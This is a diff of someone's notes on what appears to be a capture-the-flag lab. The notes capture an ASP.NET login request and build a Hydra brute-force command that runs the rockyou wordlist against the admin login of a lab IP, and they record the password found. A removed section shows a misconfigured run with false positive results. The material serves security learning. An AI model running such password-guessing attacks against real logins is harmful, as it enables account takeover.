@@ -24,7 +24,12 @@ Lets give it a try with Hydra
 ## What request type is the Windows website login form using?
 1. We can inspect the login page using the firefox inspect feature of if we used burpsuite to capture the packet
 ![[Pasted image 20251018153257.png]]
+We can also go in the request of the packet to see the full payload that we can use for Hydra
+![[Pasted image 20251018155434.png]]
 
+```
+__VIEWSTATE=YDG4yvPxsI%2FrkHv%2BytjYF3gyLeQKch33DAhPlARC03EXcitJ8FQqPBAOYWWH%2BTwUBvOe9la0g%2BlgWMl3uzRSUANGcJ%2BoG04yDaEwPXUtJ7VSLlzUecxApyFCH95f%2F3zuTuUC8u2wvQ4qR%2FxLEiE0WNQuDpvbplBGdRA1qkYfNUI4tdlAbgqeVS4mvR%2B55SVn9GxLm0AzyScOSgQiZfbGq4FRMr1cGaiV3ZrvuATvH97TPjuSBeDyVIo4YbW3XiAYd34iFnmSPivFC%2FIt%2FBBrN3SKaOSyWPVKbO%2FBxaVRzaChAdFVBhVdEX0dhHDyne7IEaCqOsWyPsnLSss5iQ5LOqjd%2FasZHdRbp56BT0y06Idq7gU4&__EVENTVALIDATION=C%2Ba9uGa5lKAY3aX0i53V929ygcyRI0wSsXwFeqqUquOzRI8B3qDGsxiF7N02GETZgpLOfIJHP2gB6J9BCwdQx%2BqNOyejkDcTfUPZhblhNxkgfn1lqyWkA9RNNshY2DkDpUMOCe52ql2bQ4s6fF9smHx4RSo1a%2F7L8Yw6VWl99JHdTkww&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=test&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
+```
 ## Cracking POST Request Login Page with Hydra (http-post-form)
 ```
 hydra -l <user> -P <password.txt> <ip-target> http-post-form "header_file_name:request:error_notif"
@@ -34,62 +39,14 @@ hydra -l <user> -P <password.txt> <ip-target> http-post-form "header_file_name:r
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
 ```
-### Hydra HTTP Crack Output
-```bash
-                                                                                                           
-┌──(root㉿kali)-[/home/z3tssu]
-└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form http://10.10.205.233/Account/login.aspx?ReturnURL=/admin/ 
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-18 15:38:48
-[ERROR] optional parameter must start with a '/' slash!
-
-                                                                                                                  
-┌──(root㉿kali)-[/home/z3tssu]
-└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-18 15:39:57
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking http-post-form://10.10.205.233:80/:username=^USER^&password=^PASS^:F=incorrect
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "princess" - 6 of 14344399 [child 5] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
-[ATTEMPT] target 10.10.205.233 - login "admin" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
-[80][http-post-form] host: 10.10.205.233   login: admin   password: babygirl
-[80][http-post-form] host: 10.10.205.233   login: admin   password: jessica
-[80][http-post-form] host: 10.10.205.233   login: admin   password: 123456
-[80][http-post-form] host: 10.10.205.233   login: admin   password: 12345
-[80][http-post-form] host: 10.10.205.233   login: admin   password: 12345678
-[80][http-post-form] host: 10.10.205.233   login: admin   password: abc123
-[80][http-post-form] host: 10.10.205.233   login: admin   password: monkey
-[80][http-post-form] host: 10.10.205.233   login: admin   password: 123456789
-[80][http-post-form] host: 10.10.205.233   login: admin   password: iloveyou
-[80][http-post-form] host: 10.10.205.233   login: admin   password: princess
-[80][http-post-form] host: 10.10.205.233   login: admin   password: daniel
-[80][http-post-form] host: 10.10.205.233   login: admin   password: rockyou
-[80][http-post-form] host: 10.10.205.233   login: admin   password: nicole
-[80][http-post-form] host: 10.10.205.233   login: admin   password: password
-[80][http-post-form] host: 10.10.205.233   login: admin   password: 1234567
-[80][http-post-form] host: 10.10.205.233   login: admin   password: lovely
-1 of 1 target successfully completed, 16 valid passwords found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-18 15:40:00
+### Complete Hydra Command 
 ```
-based on the above we have found 16 valid password? I'm not sure if that is correct lol
-lets test it out
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/Account/login.aspx:__VIEWSTATE=GlE2yCmLJhjxMS3WAapWzHpHopOnSZe%2Bql42iFWRXoiZ5H%2B8ev8wIrptaXJve3Sbd6pT%2FrwUgyiQoljyTpvaSFmerFfikAhX%2B0x7wPKeGvX%2Bln5s3lF2MiRyzfhkETMzMVqmG9YOF%2BAbgUUrv5BaI3M%2BnQEoVdHs68l%2BWv%2Fl1Kju7ufm&__EVENTVALIDATION=fHY6mqK6KeT8pJYrkCm%2FDIV5hhJF6aZ7UbhYd3Y4cdb0CgsyhEzYd6Pa1y8%2F463qYWZXFr0uMjTAP81waQE2U5kWlkKKjrEi8KYqWJBk0C%2F0Wmoo%2B0GtbYNAYGwQh%2F5bdiyauLB7eVBmo%2F%2BGKpFUGFB5GFJyiAvLS78nzJwIsoRgpDZY&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+```
 
-Maybe we have to now create a password list from the above to test it out?
+![[Pasted image 20251018160029.png]]
 
-
+### Password
+```
+login: admin   password: 1qaz2wsx
+```
